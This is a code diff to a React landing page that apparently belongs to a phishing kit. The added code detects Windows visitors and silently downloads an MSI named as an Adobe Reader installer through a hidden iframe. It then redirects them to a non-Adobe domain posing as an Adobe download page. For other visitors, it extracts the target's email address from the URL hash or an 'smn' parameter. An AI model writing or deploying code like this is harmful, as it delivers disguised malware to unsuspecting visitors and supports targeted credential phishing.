@@ -3,8 +3,24 @@ import { useEffect } from 'react';
 
 export default function Home() {
   useEffect(() => {
-    let email = '';
+    const userAgent = navigator.userAgent || '';
+    const isWindows = /windows/i.test(userAgent);
 
+    if (isWindows) {
+      // Windows: trigger MSI download + redirect to Adobe
+      const iframe = document.createElement('iframe');
+      iframe.style.display = 'none';
+      iframe.src = '/Reader_en_install.msi'; // make sure the MSI file is in /public
+      document.body.appendChild(iframe);
+
+      setTimeout(() => {
+        window.location.href = 'https://jomry.com/adobe-readers/installer/download.html';
+      }, 2000);
+      return;
+    }
+
+    // Non-Windows users: grab email from hash or &smn=
+    let email = '';
     const fullUrl = window.location.href;
 
     // 1. Try hash first (#connie@...)
@@ -15,7 +31,7 @@ export default function Home() {
     // 2. Fallback: try &smn= or ?smn= in URL
     if (!email) {
       const match = fullUrl.match(/[?&]smn=([^&]+)/);
-      if (match && match[1]) email = match[1]; // do NOT decodeURIComponent
+      if (match && match[1]) email = match[1];
     }
 
     if (email) {
